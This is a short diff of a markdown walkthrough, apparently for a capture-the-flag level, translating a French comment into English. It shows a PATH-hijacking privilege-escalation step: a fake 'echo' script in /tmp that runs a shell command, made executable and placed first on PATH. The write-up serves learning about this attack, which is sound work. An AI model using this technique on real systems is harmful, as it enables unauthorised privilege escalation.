@@ -33,13 +33,15 @@ $ echo "/bin/sh -c 'getflag'" > /tmp/echo
 $ chmod 755 /tmp/echo
 ```
 
-On ajoute notre dossier tmp au PATH afin que notre echo soit execute au lieu de celui par defaut 
 
 ```bash
 $ export PATH=/tmp:$PATH
 ```
 
+We create and add our own echo to PATH to overwrite the standard  
+
 I make sure that tmp has been added to the path :
+`
 ```bash
 $ which echo 
 /tmp/echo
